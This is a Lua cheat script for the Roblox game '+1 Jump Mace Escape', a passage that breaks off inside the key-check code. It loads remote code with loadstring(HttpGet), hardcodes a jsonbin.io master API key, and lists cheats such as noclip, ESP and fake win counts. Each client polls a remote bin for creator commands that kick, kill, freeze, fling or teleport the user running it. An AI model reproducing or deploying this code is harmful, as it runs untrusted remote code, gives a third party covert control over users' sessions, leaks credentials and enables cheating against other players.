--[[
    +1 JUMP MACE ESCAPE
    YT:@ILOVEKOCMOC
    Version: 1.1.2(Beta)
]]

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- ====== ПЕРЕМЕННЫЕ ======
local correctKey = "1337"
local creatorKey = "ILOVEKOCMOC_DEV"
local language = "RU"
local languageSelected = false
local keyAccepted = false
local savedPosition = nil
local savedTargetPosition = nil
local savedTransparency = nil
local ScriptVersion = "1.1.2(Beta)"
local KeyURL = "https://youtu.be/9Lv6lhK5n6E"

-- ====== JSONBIN.IO СИНХРОНИЗАЦИЯ ======
local BinID = "6a87f3d8da38895dfefe7981"
local ApiKey = "$2a$10$dMTaIid803n2yFFFE1etEOyZUpar0U9lX2M31VdUm5ZvaFVgWFWPq"
local BinURL = "https://api.jsonbin.io/v3/b/" .. BinID

-- ====== СЕРВИСЫ ======
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- ====== СИНХРОНИЗАЦИЯ ЧЕРЕЗ REMOTE EVENT + JSONBIN ======
local syncFolder = ReplicatedStorage:FindFirstChild("ILOVEKOCMOC_Sync")
if not syncFolder then
    syncFolder = Instance.new("Folder")
    syncFolder.Name = "ILOVEKOCMOC_Sync"
    syncFolder.Parent = ReplicatedStorage
end

local remoteEvent = syncFolder:FindFirstChild("Command")
if not remoteEvent then
    remoteEvent = Instance.new("RemoteEvent")
    remoteEvent.Name = "Command"
    remoteEvent.Parent = syncFolder
end

local function getGlobalScriptUsers()
    local total = 0
    pcall(function()
        local response = game:HttpGet(BinURL .. "/latest")
        local data = HttpService:JSONDecode(response)
        if data.record then
            total = data.record.count or 0
        end
    end)
    return total
end

local function incrementScriptCounter()
    pcall(function()
        local request = syn.request or http_request or request
        if request then
            local current = getGlobalScriptUsers()
            request({
                Url = BinURL,
                Method = "PUT",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["X-Master-Key"] = ApiKey
                },
                Body = HttpService:JSONEncode({count = current + 1})
            })
        end
    end)
end

local function sendGlobalCommand(command, data)
    pcall(function()
        remoteEvent:FireServer(command, data)
    end)
    pcall(function()
        local request = syn.request or http_request or request
        if request then
            request({
                Url = BinURL,
                Method = "PUT",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["X-Master-Key"] = ApiKey
                },
                Body = HttpService:JSONEncode({
                    command = command,
                    data = data,
                    timestamp = os.time()
                })
            })
        end
    end)
end

local function handleCommand(command, data)
    local Player = Players.LocalPlayer
    if command == "kick" then
        pcall(function() Player:Kick("Кикнут разработчиком") end)
    elseif command == "kill" then
        if Player.Character then
            local humanoid = Player.Character:FindFirstChild("Humanoid")
            if humanoid then humanoid.Health = 0 end
        end
    elseif command == "freeze" then
        if Player.Character then
            local humanoid = Player.Character:FindFirstChild("Humanoid")
            if humanoid then humanoid.WalkSpeed = 0 humanoid.JumpPower = 0 end
        end
    elseif command == "unfreeze" then
        if Player.Character then
            local humanoid = Player.Character:FindFirstChild("Humanoid")
            if humanoid then humanoid.WalkSpeed = 16 humanoid.JumpPower = 50 end
        end
    elseif command == "heal" then
        if Player.Character then
            local humanoid = Player.Character:FindFirstChild("Humanoid")
            if humanoid then humanoid.Health = humanoid.MaxHealth end
        end
    elseif command == "fling" then
        spawn(function()
            local flingActive = true
            task.delay(5, function() flingActive = false end)
            while flingActive do
                if Player.Character then
                    local hrp = Player.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        hrp.Velocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
                        hrp.RotVelocity = Vector3.new(math.random(-10, 10), math.random(-10, 10), math.random(-10, 10))
                    end
                end
                task.wait(0.1)
            end
        end)
    elseif command == "tp" then
        if data and Player.Character then
            local hrp = Player.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.CFrame = CFrame.new(data.x, data.y, data.z)
            end
        end
    end
end

remoteEvent.OnClientEvent:Connect(function(command, data)
    handleCommand(command, data)
end)

spawn(function()
    local lastTimestamp = 0
    while true do
        pcall(function()
            local response = game:HttpGet(BinURL .. "/latest")
            local data = HttpService:JSONDecode(response)
            if data.record and data.record.command and data.record.timestamp then
                if data.record.timestamp > lastTimestamp then
                    lastTimestamp = data.record.timestamp
                    handleCommand(data.record.command, data.record.data)
                end
            end
        end)
        task.wait(1)
    end
end)

-- ====== ЛОГИ АПДЕЙТОВ ======
local updateLogs = {
    {
        version = "1.1.2(Beta)",
        changes = "Auto Mace attack fix - теперь проверяет ВЕСЬ workspace на MaceTargetHighlight"
    },
    {
        version = "hi",
        changes = "this iam ILOVEKOCMOC"
    },
    {
        version = "1.1.1(Beta)",
        changes = "Добавлена глобальная синхронизация и панель разраба"
    },
    {
        version = "1.0.1(Beta)",
        changes = "Добавлено сообщение копирование + ютуб ссылка на ключ"
    }
}

-- ====== ТЕКСТЫ ======
local texts = {
    RU = {
        key_title = "🔐 ВВЕДИТЕ КЛЮЧ",
        key_label = "Введите ключ:",
        key_error = "❌ НЕВЕРНЫЙ КЛЮЧ!",
        key_success = "✅ КЛЮЧ ПРИНЯТ!",
        get_key = "📺 ПОЛУЧИТЬ КЛЮЧ",
        version_text = "Версия: " .. ScriptVersion,
        lang_select = "🌍 ВЫБЕРИТЕ ЯЗЫК:",
        lang_select_wait = "👇 ВЫБЕРИТЕ ЯЗЫК ЧТОБЫ ПРОДОЛЖИТЬ 👇",
        lang_ru = "🇷🇺 РУССКИЙ",
        lang_en = "🇬🇧 АНГЛИЙСКИЙ",
        menu_title = "🔥 +1 JUMP MACE ESCAPE",
        tab_money = "💰 Деньги",
        tab_main = "🏠 Главная",
        tab_player = "👤 Игрок",
        tab_creator = "👑 Создатель",
        tab_logs = "📋 Логи",
        btn_wins = "🏆 +1000 ПОБЕД",
        btn_hell = "💰 +66 HELL МОНЕТ",
        btn_farm = "🦘 АВТО-ФАРМ",
        btn_jump = "🦘 БЕСКОНЕЧНЫЕ ПРЫЖКИ",
        btn_mace = "🔨 АВТО MACE УДАР",
        btn_noclip = "👻 НОКЛИП",
        btn_speed = "⚡ СКОРОСТЬ",
        btn_jump_power = "🦘 СИЛА ПРЫЖКА",
        btn_esp = "🎯 ESP ИГРОКОВ",
        btn_antiafk = "🔄 АНТИ-АФК",
        btn_mobile_farm = "📱 МОБ. ФАРМ",
        btn_mobile_jump = "📱 МОБ. ПРЫЖКИ",
        btn_mobile_mace = "📱 МОБ. MACE",
        btn_mobile_noclip = "📱 МОБ. НОКЛИП",
        btn_mobile_esp = "📱 МОБ. ESP",
        btn_mobile_antiafk = "📱 МОБ. АНТИ-АФК",
        bind_wins = "Бинд: +1000 побед",
        bind_hell = "Бинд: +66 монет",
        bind_farm = "Бинд: Фарм",
        bind_jump = "Бинд: Прыжки",
        bind_mace = "Бинд: Mace",
        bind_noclip = "Бинд: Ноклип",
        bind_esp = "Бинд: ESP",
        bind_antiafk = "Бинд: Анти-АФК",
        btn_close = "🗑️ УНИЧТОЖИТЬ МЕНЮ",
        speed_value = "Скорость",
        jump_value = "Сила прыжка",
        mobile_title = "МОБИЛЬНАЯ КНОПКА",
        mobile_on = "ВКЛ",
        mobile_off = "ВЫКЛ",
        mobile_close = "✕",
        mobile_farm_title = "🦘 ФАРМ",
        mobile_jump_title = "🦘 ПРЫЖКИ",
        mobile_mace_title = "🔨 MACE",
        mobile_noclip_title = "👻 НОКЛИП",
        mobile_esp_title = "🎯 ESP",
        mobile_antiafk_title = "🔄 АНТИ-АФК",
        success_farm_start = "✅ Авто-фарм запущен!",
        success_farm_stop = "⏸️ Авто-фарм остановлен!",
        success_jump_start = "✅ Бесконечные прыжки запущены!",
        success_jump_stop = "⏸️ Бесконечные прыжки остановлены!",
        success_mace_start = "✅ Авто Mace удар запущен!",
        success_mace_stop = "⏸️ Авто Mace удар остановлен!",
        success_noclip_start = "✅ Ноклип включен!",
        success_noclip_stop = "⏸️ Ноклип выключен!",
        success_esp_start = "✅ ESP включен!",
        success_esp_stop = "⏸️ ESP выключен!",
        success_antiafk_start = "✅ Анти-АФК включен!",
        success_antiafk_stop = "⏸️ Анти-АФК выключен!",
        success_return = "✅ Возвращён на исходную позицию!",
        loaded = "✅ Меню успешно загружено! YT:@ILOVEKOCMOC",
        error_title = "Ошибка",
        success_title = "Успех",
        farm_title = "Авто-Фарм",
        jump_title = "Прыжки",
        mace_title = "Mace Удар",
        noclip_title = "Ноклип",
        esp_title = "ESP",
        antiafk_title = "Анти-АФК",
        err_target = "❌ FirstTarget не найден!",
        copy_success = "✅ Ссылка скопирована в буфер обмена!",
        select_language_first = "❌ Сначала выберите язык!",
        creator_title = "👑 ПАНЕЛЬ РАЗРАБОТЧИКА",
        creator_key_label = "Введите ключ разработчика:",
        creator_key_error = "❌ НЕВЕРНЫЙ КЛЮЧ РАЗРАБОТЧИКА!",
        creator_key_success = "✅ ДОСТУП РАЗРЕШЁН!",
        creator_global_users = "🌍 Всего запусков: ",
        creator_kick_global = "👢 Кикнуть всех ГЛОБАЛЬНО",
        creator_kill_global = "💀 Убить всех ГЛОБАЛЬНО",
        creator_freeze_global = "🧊 Заморозить всех ГЛОБАЛЬНО",
        creator_unfreeze_global = "🔥 Разморозить всех ГЛОБАЛЬНО",
        creator_heal_global = "❤️ Вылечить всех ГЛОБАЛЬНО",
        creator_fling_global = "🌀 Зафлигать всех ГЛОБАЛЬНО",
        creator_success_global = "✅ Команда отправлена всем игрокам со скриптом!"
    },
    EN = {
        key_title = "🔐 ENTER KEY",
        key_label = "Enter key:",
        key_error = "❌ WRONG KEY!",
        key_success = "✅ KEY ACCEPTED!",
        get_key = "📺 GET KEY",
        version_text = "Version: " .. ScriptVersion,
        lang_select = "🌍 SELECT LANGUAGE:",
        lang_select_wait = "👇 SELECT LANGUAGE TO CONTINUE 👇",
        lang_ru = "🇷🇺 RUSSIAN",
        lang_en = "🇬🇧 ENGLISH",
        menu_title = "🔥 +1 JUMP MACE ESCAPE",
        tab_money = "💰 Money",
        tab_main = "🏠 Main",
        tab_player = "👤 Player",
        tab_creator = "👑 Creator",
        tab_logs = "📋 Logs",
        btn_wins = "🏆 +1000 WINS",
        btn_hell = "💰 +66 HELL COINS",
        btn_farm = "🦘 AUTO FARM",
        btn_jump = "🦘 INFINITE JUMPS",
        btn_mace = "🔨 AUTO MACE HIT",
        btn_noclip = "👻 NOCLIP",
        btn_speed = "⚡ SPEED",
        btn_jump_power = "🦘 JUMP POWER",
        btn_esp = "🎯 PLAYER ESP",
        btn_antiafk = "🔄 ANTI-AFK",
        btn_mobile_farm = "📱 MOB. FARM",
        btn_mobile_jump = "📱 MOB. JUMPS",
        btn_mobile_mace = "📱 MOB. MACE",
        btn_mobile_noclip = "📱 MOB. NOCLIP",
        btn_mobile_esp = "📱 MOB. ESP",
        btn_mobile_antiafk = "📱 MOB. ANTI-AFK",
        bind_wins = "Bind: +1000 wins",
        bind_hell = "Bind: +66 coins",
        bind_farm = "Bind: Farm",
        bind_jump = "Bind: Jumps",
        bind_mace = "Bind: Mace",
        bind_noclip = "Bind: Noclip",
        bind_esp = "Bind: ESP",
        bind_antiafk = "Bind: Anti-AFK",
        btn_close = "🗑️ DESTROY MENU",
        speed_value = "Speed",
        jump_value = "Jump Power",
        mobile_title = "MOBILE BUTTON",
        mobile_on = "ON",
        mobile_off = "OFF",
        mobile_close = "✕",
        mobile_farm_title = "🦘 FARM",
        mobile_jump_title = "🦘 JUMPS",
        mobile_mace_title = "🔨 MACE",
        mobile_noclip_title = "👻 NOCLIP",
        mobile_esp_title = "🎯 ESP",
        mobile_antiafk_title = "🔄 ANTI-AFK",
        success_farm_start = "✅ Auto farm started!",
        success_farm_stop = "⏸️ Auto farm stopped!",
        success_jump_start = "✅ Infinite jumps started!",
        success_jump_stop = "⏸️ Infinite jumps stopped!",
        success_mace_start = "✅ Auto Mace hit started!",
        success_mace_stop = "⏸️ Auto Mace hit stopped!",
        success_noclip_start = "✅ Noclip enabled!",
        success_noclip_stop = "⏸️ Noclip disabled!",
        success_esp_start = "✅ ESP enabled!",
        success_esp_stop = "⏸️ ESP disabled!",
        success_antiafk_start = "✅ Anti-AFK enabled!",
        success_antiafk_stop = "⏸️ Anti-AFK disabled!",
        success_return = "✅ Returned to original position!",
        loaded = "✅ Menu loaded successfully! YT:@ILOVEKOCMOC",
        error_title = "Error",
        success_title = "Success",
        farm_title = "Auto Farm",
        jump_title = "Jumps",
        mace_title = "Mace Hit",
        noclip_title = "Noclip",
        esp_title = "ESP",
        antiafk_title = "Anti-AFK",
        err_target = "❌ FirstTarget not found!",
        copy_success = "✅ Link copied to clipboard!",
        select_language_first = "❌ Select language first!",
        creator_title = "👑 CREATOR PANEL",
        creator_key_label = "Enter creator key:",
        creator_key_error = "❌ WRONG CREATOR KEY!",
        creator_key_success = "✅ ACCESS GRANTED!",
        creator_global_users = "🌍 Total launches: ",
        creator_kick_global = "👢 Kick all GLOBAL",
        creator_kill_global = "💀 Kill all GLOBAL",
        creator_freeze_global = "🧊 Freeze all GLOBAL",
        creator_unfreeze_global = "🔥 Unfreeze all GLOBAL",
        creator_heal_global = "❤️ Heal all GLOBAL",
        creator_fling_global = "🌀 Fling all GLOBAL",
        creator_success_global = "✅ Command sent to all script users!"
    }
}

local function getText(key)
    return texts[language][key]
end

-- ====== ФУНКЦИЯ ДЛЯ ПРОЗРАЧНОСТИ ======
local function setTargetTransparency(targetPart, transparency)
    if not targetPart then return end
    if targetPart:IsA("Part") then
        savedTransparency = targetPart.Transparency
        targetPart.Transparency = transparency
    end
    if targetPart:IsA("Model") then
        for _, child in ipairs(targetPart:GetDescendants()) do
            if child:IsA("Part") or child:IsA("MeshPart") or child:IsA("UnionOperation") then
                savedTransparency = child.Transparency
                child.Transparency = transparency
            end
        end
    end
    if targetPart:IsA("Part") then
        for _, child in ipairs(targetPart:GetDescendants()) do
            if child:IsA("Part") or child:IsA("MeshPart") or child:IsA("UnionOperation") then
                child.Transparency = transparency
            end
        end
    end
end

local function restoreTargetTransparency(targetPart)
    if not targetPart then return end
    if targetPart:IsA("Part") then
        if savedTransparency then targetPart.Transparency = savedTransparency else targetPart.Transparency = 0 end
    end
    if targetPart:IsA("Model") then
        for _, child in ipairs(targetPart:GetDescendants()) do
            if child:IsA("Part") or child:IsA("MeshPart") or child:IsA("UnionOperation") then child.Transparency = 0 end
        end
    end
    if targetPart:IsA("Part") then
        for _, child in ipairs(targetPart:GetDescendants()) do
            if child:IsA("Part") or child:IsA("MeshPart") or child:IsA("UnionOperation") then child.Transparency = 0 end
        end
    end
    savedTransparency = nil
end

-- ====== ФУНКЦИЯ УВЕДОМЛЕНИЯ О КОПИРОВАНИИ ======
local function createCopyNotification()
    local Player = Players.LocalPlayer
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "Notif_" .. math.random(10000, 99999)
    ScreenGui.Parent = Player:WaitForChild("PlayerGui")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Archivable = false
    
    local Notification = Instance.new("Frame")
    Notification.Name = "N_" .. math.random(10000, 99999)
    Notification.Size = UDim2.new(0, 250, 0, 40)
    Notification.Position = UDim2.new(1, 20, 0, 20)
    Notification.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    Notification.BorderSizePixel = 0
    Notification.Parent = ScreenGui
    
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 8)
    UICorner.Parent = Notification
    
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Color = Color3.fromRGB(0, 200, 100)
    UIStroke.Thickness = 2
    UIStroke.Parent = Notification
    
    local Icon = Instance.new("TextLabel")
    Icon.Name = "I_" .. math.random(10000, 99999)
    Icon.Size = UDim2.new(0, 30, 1, 0)
    Icon.Position = UDim2.new(0, 10, 0, 0)
    Icon.Text = "📋"
    Icon.BackgroundTransparency = 1
    Icon.Font = Enum.Font.GothamBold
    Icon.TextSize = 18
    Icon.Parent = Notification
    
    local Text = Instance.new("TextLabel")
    Text.Name = "T_" .. math.random(10000, 99999)
    Text.Size = UDim2.new(1, -50, 1, 0)
    Text.Position = UDim2.new(0, 45, 0, 0)
    Text.Text = getText("copy_success")
    Text.TextColor3 = Color3.fromRGB(255, 255, 255)
    Text.BackgroundTransparency = 1
    Text.Font = Enum.Font.Gotham
    Text.TextSize = 12
    Text.TextXAlignment = Enum.TextXAlignment.Left
    Text.Parent = Notification
    
    local tween1 = TweenService:Create(Notification, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
        Position = UDim2.new(1, -270, 0, 20)
    })
    tween1:Play()
    
    task.wait(5)
    
    local tween2 = TweenService:Create(Notification, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
        Position = UDim2.new(1, 20, 0, 20)
    })
    tween2:Play()
    tween2.Completed:Connect(function()
        ScreenGui:Destroy()
    end)
end

-- ====== ФУНКЦИЯ СОЗДАНИЯ МОБИЛЬНОГО ОКНА ======
local function createMobileWindow(title, onCallback, offCallback)
    local Player = Players.LocalPlayer
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "MW_" .. math.random(10000, 99999)
    ScreenGui.Parent = Player:WaitForChild("PlayerGui")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Archivable = false
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "F_" .. math.random(10000, 99999)
    MainFrame.Size = UDim2.new(0, 200, 0, 80)
    MainFrame.Position = UDim2.new(0.8, -10, 0.5, -40)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = MainFrame
    
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Name = "T_" .. math.random(10000, 99999)
    TitleLabel.Size = UDim2.new(1, -30, 0, 25)
    TitleLabel.Position = UDim2.new(0, 10, 0, 5)
    TitleLabel.Text = title
    TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextSize = 14
    TitleLabel.Parent = MainFrame
    
    local CloseButton = Instance.new("TextButton")
    CloseButton.Name = "C_" .. math.random(10000, 99999)
    CloseButton.Size = UDim2.new(0, 20, 0, 20)
    CloseButton.Position = UDim2.new(1, -25, 0, 3)
    CloseButton.Text = getText("mobile_close")
    CloseButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.TextSize = 12
    CloseButton.Parent = MainFrame
    
    local ToggleButton = Instance.new("TextButton")
    ToggleButton.Name = "TB_" .. math.random(10000, 99999)
    ToggleButton.Size = UDim2.new(0.8, 0, 0, 35)
    ToggleButton.Position = UDim2.new(0.1, 0, 0.45, 0)
    ToggleButton.Text = getText("mobile_off")
    ToggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleButton.Font = Enum.Font.GothamBold
    ToggleButton.TextSize = 14
    ToggleButton.Parent = MainFrame
    
    local isActive = false
    
    ToggleButton.MouseButton1Click:Connect(function()
        if isActive then
            isActive = false
            ToggleButton.Text = getText("mobile_off")
            ToggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
            if offCallback then pcall(offCallback) end
        else
            isActive = true
            ToggleButton.Text = getText("mobile_on")
            ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
            if onCallback then pcall(onCallback) end
        end
    end)
    
    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
    
    return ScreenGui
end

-- ====== АНИМАЦИЯ ДЛЯ КЛЮЧ СИСТЕМЫ ======
local function animateKeySystemIn(MainFrame)
    MainFrame.Position = UDim2.new(0.5, -200, 1, 100)
    MainFrame.Visible = true
    
    local tween1 = TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -200, 0.5, -220)
    })
    local tween2 = TweenService:Create(MainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -200, 0.5, -200)
    })
    
    tween1:Play()
    tween1.Completed:Connect(function()
        tween2:Play()
    end)
end

local function animateKeySystemOut(MainFrame, ScreenGui, callback)
    local tween1 = TweenService:Create(MainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -200, 0.5, -220)
    })
    local tween2 = TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
        Position = UDim2.new(0.5, -200, 1, 100)
    })
    
    tween1:Play()
    tween1.Completed:Connect(function()
        tween2:Play()
        tween2.Completed:Connect(function()
            if callback then callback() end
        end)
    end)
end

-- ====== СОЗДАНИЕ GUI ДЛЯ КЛЮЧА ======
local function createKeySystem()
    local Player = Players.LocalPlayer
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "KS_" .. math.random(10000, 99999)
    ScreenGui.Parent = Player:WaitForChild("PlayerGui")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Archivable = false
    
    local Background = Instance.new("Frame")
    Background.Name = "BG_" .. math.random(10000, 99999)
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Background.BackgroundTransparency = 1
    Background.Parent = ScreenGui
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MF_" .. math.random(10000, 99999)
    MainFrame.Size = UDim2.new(0, 400, 0, 400)
    MainFrame.Position = UDim2.new(0.5, -200, 1, 100)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    MainFrame.BorderSizePixel = 0
    MainFrame.Visible = false
    MainFrame.Parent = ScreenGui
    
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = MainFrame
    
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Color = Color3.fromRGB(255, 200, 0)
    UIStroke.Thickness = 2
    UIStroke.Parent = MainFrame
    
    local CloseButton = Instance.new("TextButton")
    CloseButton.Name = "X_" .. math.random(10000, 99999)
    CloseButton.Size = UDim2.new(0, 25, 0, 25)
    CloseButton.Position = UDim2.new(1, -30, 0, 5)
    CloseButton.Text = "✕"
    CloseButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.TextSize = 14
    CloseButton.Parent = MainFrame
    
    local VersionLabel = Instance.new("TextLabel")
    VersionLabel.Name = "V_" .. math.random(10000, 99999)
    VersionLabel.Size = UDim2.new(1, 0, 0, 25)
    VersionLabel.Position = UDim2.new(0, 0, 0, 5)
    VersionLabel.Text = getText("version_text")
    VersionLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    VersionLabel.BackgroundTransparency = 1
    VersionLabel.Font = Enum.Font.Gotham
    VersionLabel.TextSize = 12
    VersionLabel.Parent = MainFrame
    
    local Title = Instance.new("TextLabel")
    Title.Name = "T_" .. math.random(10000, 99999)
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 30)
    Title.Text = "🔐 ВВЕДИТЕ КЛЮЧ"
    Title.TextColor3 = Color3.fromRGB(255, 200, 0)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 20
    Title.Parent = MainFrame
    
    local LangTitle = Instance.new("TextLabel")
    LangTitle.Name = "L_" .. math.random(10000, 99999)
    LangTitle.Size = UDim2.new(1, 0, 0, 25)
    LangTitle.Position = UDim2.new(0, 0, 0.7, 0)
    LangTitle.Text = getText("lang_select_wait")
    LangTitle.TextColor3 = Color3.fromRGB(255, 200, 0)
    LangTitle.BackgroundTransparency = 1
    LangTitle.Font = Enum.Font.GothamBold
    LangTitle.TextSize = 14
    LangTitle.Parent = MainFrame
    
    local KeyInput = Instance.new("TextBox")
    KeyInput.Name = "K_" .. math.random(10000, 99999)
    KeyInput.Size = UDim2.new(0.6, 0, 0, 40)
    KeyInput.Position = UDim2.new(0.2, 0, 0.2, 0)
    KeyInput.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    KeyInput.Font = Enum.Font.Gotham
    KeyInput.TextSize = 18
    KeyInput.ClearTextOnFocus = false
    KeyInput.PlaceholderText = "Выберите язык..."
    KeyInput.Text = ""
    KeyInput.Parent = MainFrame
    KeyInput.Active = false
    KeyInput.Selectable = false
    KeyInput.TextEditable = false
    
    local ErrorLabel = Instance.new("TextLabel")
    ErrorLabel.Name = "E_" .. math.random(10000, 99999)
    ErrorLabel.Size = UDim2.new(0.8, 0, 0, 25)
    ErrorLabel.Position = UDim2.new(0.1, 0, 0.33, 0)
    ErrorLabel.Text = ""
    ErrorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    ErrorLabel.BackgroundTransparency = 1
    ErrorLabel.Font = Enum.Font.Gotham
    ErrorLabel.TextSize = 14
    ErrorLabel.Parent = MainFrame
    
    local CheckButton = Instance.new("TextButton")
    CheckButton.Name = "CB_" .. math.random(10000, 99999)
    CheckButton.Size = UDim2.new(0.4, 0, 0, 40)
    CheckButton.Position = UDim2.new(0.3, 0, 0.42, 0)
    CheckButton.Text = "✅ ПРОВЕРИТЬ"
    CheckButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    CheckButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CheckButton.Font = Enum.Font.GothamBold
    CheckButton.TextSize = 14
    CheckButton.Parent = MainFrame
    
    local GetKeyButton = Instance.new("TextButton")
    GetKeyButton.Name = "GK_" .. math.random(10000, 99999)
    GetKeyButton.Size = UDim2.new(0.4, 0, 0, 40)
    GetKeyButton.Position = UDim2.new(0.3, 0, 0.55, 0)
    GetKeyButton.Text = getText("get_key")
    GetKeyButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    GetKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    GetKeyButton.Font = Enum.Font.GothamBold
    GetKeyButton.TextSize = 14
    GetKeyButton.Parent = MainFrame
    
    local RUBtn = Instance.new("TextButton")
    RUBtn.Name = "RU_" .. math.random(10000, 99999)
    RUBtn.Size = UDim2.new(0.35, 0, 0, 35)
    RUBtn.Position = UDim2.new(0.1, 0, 0.78, 0)
    RUBtn.Text = "🇷🇺 РУССКИЙ"
    RUBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    RUBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    RUBtn.Font = Enum.Font.GothamBold
    RUBtn.TextSize = 12
    RUBtn.Parent = MainFrame
    
    local ENBtn = Instance.new("TextButton")
    ENBtn.Name = "EN_" .. math.random(10000, 99999)
    ENBtn.Size = UDim2.new(0.35, 0, 0, 35)
    ENBtn.Position = UDim2.new(0.55, 0, 0.78, 0)
    ENBtn.Text = "🇬🇧 ENGLISH"
    ENBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    ENBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    ENBtn.Font = Enum.Font.GothamBold
    ENBtn.TextSize = 12
    ENBtn.Parent = MainFrame
    
    animateKeySystemIn(MainFrame)
    TweenService:Create(Background, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {BackgroundTransparency = 0.7}):Play()
    
    local blinking = true
    local blinkLoop
    blinkLoop = RunService.Heartbeat:Connect(function()
        if not blinking or languageSelected then
            if blinkLoop then blinkLoop:Disconnect() end
            return
        end
        local currentTransparency = LangTitle.TextTransparency
        local targetTransparency = currentTransparency > 0.5 and 0 or 1
        TweenService:Create(LangTitle, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {
            TextTransparency = targetTransparency
        }):Play()
        task.wait(0.6)
    end)
    
    local function closeKeySystem()
        blinking = false
        animateKeySystemOut(MainFrame, ScreenGui, function()
            ScreenGui:Destroy()
        end)
    end
    
    CloseButton.MouseButton1Click:Connect(function()
        closeKeySystem()
    end)
    
    GetKeyButton.MouseButton1Click:Connect(function()
        pcall(function()
            setclipboard(KeyURL)
        end)
        createCopyNotification()
    end)
    
    local function unlockKeyInput()
        languageSelected = true
        blinking = false
        if blinkLoop then blinkLoop:Disconnect() end
        KeyInput.Active = true
        KeyInput.Selectable = true
        KeyInput.TextEditable = true
        KeyInput.PlaceholderText = getText("key_label")
        CheckButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
        TweenService:Create(LangTitle, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {
            TextTransparency = 1
        }):Play()
    end
    
    CheckButton.MouseButton1Click:Connect(function()
        if not languageSelected then
            ErrorLabel.Text = getText("select_language_first")
            ErrorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
            return
        end
        if KeyInput.Text == correctKey then
            ErrorLabel.Text = getText("key_success")
            ErrorLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
            incrementScriptCounter()
            task.wait(0.5)
            animateKeySystemOut(MainFrame, ScreenGui, function()
                ScreenGui:Destroy()
                keyAccepted = true
